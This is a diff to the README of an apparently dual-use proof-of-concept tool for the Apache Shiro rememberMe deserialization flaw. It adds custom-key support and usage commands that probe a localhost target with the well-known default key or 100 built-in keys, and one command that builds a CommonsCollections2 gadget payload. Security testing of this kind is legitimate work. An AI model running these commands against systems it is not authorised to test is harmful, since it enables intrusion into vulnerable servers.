@@ -3,6 +3,23 @@ mvn package 编译
 ## changelog
 1. 新增shiro 检测方式(对，就是那个不需要gadget的检测方式) 2020.7.30
 2. 新增shiro 100 key
+3. 支持自定义key
+
+自定义key检测
+```
+java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc http://localhost:8080/samples_web_war/ kPH+bIxk5D2deZiIxcaaaA==
+```
+
+内置100key检测
+
+```
+java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc http://localhost:8080/sam
+ples_web_war/
+```
+
+```
+java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar kPH+bIxk5D2deZiIxcaaaA== CommonsCollections2 XraySysProp
+```
 
 ## 检测方式
 运行
